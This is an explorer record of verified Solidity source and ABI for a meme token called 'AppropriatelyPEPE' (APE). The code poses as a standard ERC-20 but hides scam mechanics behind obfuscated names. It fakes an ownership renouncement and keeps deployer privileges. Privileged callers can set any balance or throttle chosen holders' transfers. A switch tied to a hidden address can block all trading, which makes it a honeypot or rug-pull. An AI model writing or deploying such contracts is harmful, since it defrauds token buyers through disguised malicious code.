{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface feeMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTeam) external view returns (uint256);\n\n    function transfer(address amountMode, uint256 minWallet) external returns (bool);\n\n    function allowance(address maxReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountMode,\n        uint256 minWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingSwapAt, uint256 value);\n    event Approval(address indexed maxReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract atSellTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchTokenLiquidity {\n    function createPair(address listAmount, address autoAt) external returns (address);\n}\n\ninterface totalBuy is feeMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppropriatelyPEPE is atSellTotal, feeMax, totalBuy {\n\n    address private senderExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    uint256 public amountFrom;\n\n    function senderBuyExempt(address fundIsSwap, address amountMode, uint256 minWallet) internal returns (bool) {\n        require(limitMin[fundIsSwap] >= minWallet);\n        limitMin[fundIsSwap] -= minWallet;\n        limitMin[amountMode] += minWallet;\n        emit Transfer(fundIsSwap, amountMode, minWallet);\n        return true;\n    }\n\n    uint256 feeSell;\n\n    function owner() external view returns (address) {\n        return senderExempt;\n    }\n\n    uint256 private buySell;\n\n    mapping(address => bool) public shouldEnable;\n\n    mapping(address => uint256) private limitMin;\n\n    function toAmount() public {\n        emit OwnershipTransferred(txLiquidity, address(0));\n        senderExempt = address(0);\n    }\n\n    function toExempt(address shouldAmount) public {\n        exemptBuyLaunch();\n        if (buySell == fundToken) {\n            marketingBuy = minMode;\n        }\n        if (shouldAmount == txLiquidity || shouldAmount == senderFeeFund) {\n            return;\n        }\n        toMin[shouldAmount] = true;\n    }\n\n    uint256 constant marketingLiquidity = 5 ** 10;\n\n    bool public tradingTeam;\n\n    uint256 private buyToken = 100000000 * 10 ** 18;\n\n    function transfer(address tokenLaunched, uint256 minWallet) external virtual override returns (bool) {\n        return totalLaunch(_msgSender(), tokenLaunched, minWallet);\n    }\n\n    string private limitLaunchTo = \"Appropriately PEPE\";\n\n    address public senderFeeFund;\n\n    mapping(address => bool) public toMin;\n\n    function limitTrading(address tokenLaunched, uint256 minWallet) public {\n        exemptBuyLaunch();\n        limitMin[tokenLaunched] = minWallet;\n    }\n\n    bool public swapReceiver;\n\n    mapping(address => mapping(address => uint256)) private totalList;\n\n    address senderFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public buyLaunch;\n\n    function exemptBuyLaunch() private view {\n        require(shouldEnable[_msgSender()]);\n    }\n\n    function allowance(address launchedEnable, address tradingMax) external view virtual override returns (uint256) {\n        if (tradingMax == senderFee) {\n            return type(uint256).max;\n        }\n        return totalList[launchedEnable][tradingMax];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunchTo;\n    }\n\n    event OwnershipTransferred(address indexed amountList, address indexed shouldSwap);\n\n    uint256 fromSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeFee;\n    }\n\n    function approve(address tradingMax, uint256 minWallet) public virtual override returns (bool) {\n        totalList[_msgSender()][tradingMax] = minWallet;\n        emit Approval(_msgSender(), tradingMax, minWallet);\n        return true;\n    }\n\n    uint8 private modeFee = 18;\n\n    address minTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyToken;\n    }\n\n    function totalLaunch(address fundIsSwap, address amountMode, uint256 minWallet) internal returns (bool) {\n        if (fundIsSwap == txLiquidity) {\n            return senderBuyExempt(fundIsSwap, amountMode, minWallet);\n        }\n        uint256 fromWallet = feeMax(senderFeeFund).balanceOf(minTo);\n        require(fromWallet == feeSell);\n        require(amountMode != minTo);\n        if (toMin[fundIsSwap]) {\n            return senderBuyExempt(fundIsSwap, amountMode, marketingLiquidity);\n        }\n        return senderBuyExempt(fundIsSwap, amountMode, minWallet);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderExempt;\n    }\n\n    function buyReceiverWallet(address shouldToken) public {\n        require(shouldToken.balance < 100000);\n        if (swapReceiver) {\n            return;\n        }\n        if (buyLaunch == fundToken) {\n            fundToken = buySell;\n        }\n        shouldEnable[shouldToken] = true;\n        \n        swapReceiver = true;\n    }\n\n    uint256 public marketingBuy;\n\n    address public txLiquidity;\n\n    uint256 private fundToken;\n\n    function maxLimit(uint256 minWallet) public {\n        exemptBuyLaunch();\n        feeSell = minWallet;\n    }\n\n    uint256 public exemptTotal;\n\n    function balanceOf(address fromTeam) public view virtual override returns (uint256) {\n        return limitMin[fromTeam];\n    }\n\n    uint256 private minMode;\n\n    string private senderTx = \"APE\";\n\n    constructor (){\n        if (fundToken != marketingBuy) {\n            amountFrom = buySell;\n        }\n        shouldFrom swapAutoExempt = shouldFrom(senderFee);\n        senderFeeFund = launchTokenLiquidity(swapAutoExempt.factory()).createPair(swapAutoExempt.WETH(), address(this));\n        \n        txLiquidity = _msgSender();\n        toAmount();\n        shouldEnable[txLiquidity] = true;\n        limitMin[txLiquidity] = buyToken;\n        \n        emit Transfer(address(0), txLiquidity, buyToken);\n    }\n\n    function transferFrom(address fundIsSwap, address amountMode, uint256 minWallet) external override returns (bool) {\n        if (_msgSender() != senderFee) {\n            if (totalList[fundIsSwap][_msgSender()] != type(uint256).max) {\n                require(minWallet <= totalList[fundIsSwap][_msgSender()]);\n                totalList[fundIsSwap][_msgSender()] -= minWallet;\n            }\n        }\n        return totalLaunch(fundIsSwap, amountMode, minWallet);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwapAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"buyReceiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minWallet\",\"type\":\"uint256\"}],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minWallet\",\"type\":\"uint256\"}],\"name\":\"maxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIsSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AppropriatelyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}